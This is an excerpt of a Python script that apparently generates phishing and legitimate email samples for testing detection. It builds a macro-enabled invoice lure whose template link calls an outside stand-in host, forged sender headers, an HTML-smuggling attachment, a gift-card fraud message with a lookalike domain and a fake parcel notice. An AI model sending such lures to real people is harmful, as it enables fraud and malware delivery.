...
def docm_with_macro() -> bytes:
    ...
    z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
    ...
    z.writestr("word/document.xml", '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Please enable content to view this invoice.</w:t></w:r></w:p></w:body></w:document>')
    z.writestr("word/_rels/document.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>')
    z.writestr("word/_rels/settings.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://cdn-update-templates.top/t.dotm" TargetMode="External"/></Relationships>')
...
def mail(frm: str, to: str, subject: str, text: str, html: str | None = None, attachments=(), extra_headers=(),
         reply_to: str | None = None, date: str | None = None) -> bytes:
...
RECEIVED_BAD = [
    ...
    ("Received", "from smtp-out.mail-delivery-notify.xyz (unknown [185.220.101.4]) by mail.interne.fr with ESMTP id 7Ab1 for <j.dupont@interne.fr>; Tue, 01 Sep 2026 22:13:58 +0000"),
    ...
    ("Authentication-Results", "mx.interne.fr; spf=fail (sender IP is 185.220.101.4) smtp.mailfrom=mail-delivery-notify.xyz; dkim=none; dmarc=fail action=none header.from=interne-fr.co"),
...
def build(out: str) -> list[str]:
    ...
    samples["01-ceo-spoof-macro.eml"] = mail(
        ...
        html=SPOOF_HTML,
        attachments=[("Facture_09-2026.docm", docm_with_macro(), "application", "vnd.ms-word.document.macroEnabled.12"),
                     ("Document.html", html_smuggle(), "text", "html")],
        extra_headers=RECEIVED_BAD, reply_to="marie.lefevre.dg@gmail.com", date="Tue, 01 Sep 2026 22:13:40 +0000")
    samples["02-legit-ceo.eml"] = mail(
        '"Marie Lefevre" <marie.lefevre@interne.fr>', "j.dupont@interne.fr", "Point hebdo",
    ...
    samples["03-giftcard-bec.eml"] = mail(
        ...
        extra_headers=[("Received", "from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41]) by mx.interne.fr with ESMTPS id 3; Wed, 02 Sep 2026 07:45:00 +0000"),
        ...
        reply_to=f"marie@{PUNY_LOOKALIKE}", date="Wed, 02 Sep 2026 07:44:58 +0000")
    b = io.BytesIO()
    ...
    samples["04-dhl-pdf-zip.eml"] = mail(
        '"DHL Express" <notification@dhl-express-delivery.top>', "j.dupont@interne.fr", "Your parcel is on hold - customs fee required",
        ...
        extra_headers=[("Received", "from vps-4412.hostingprovider.ru (vps-4412.hostingprovider.ru [45.155.205.33]) by mx.interne.fr with ESMTP id 9; Wed, 02 Sep 2026 03:12:00 +0000"),
    ...
    samples["05-newsletter.eml"] = mail(
        '"Tech Weekly" <news@techweekly-mail.com>', "j.dupont@interne.fr", "This week in security",
        "Read the latest articles: https://techweekly-mail.com/issue/42\nUnsubscribe: https://techweekly-mail.com/unsub?u=abc",
        extra_headers=[("List-Id", "<news.techweekly-mail.com>"), ("List-Unsubscribe", "<https://techweekly-mail.com/unsub?u=abc>"), ("X-Mailer", "Mailchimp Mailer"),
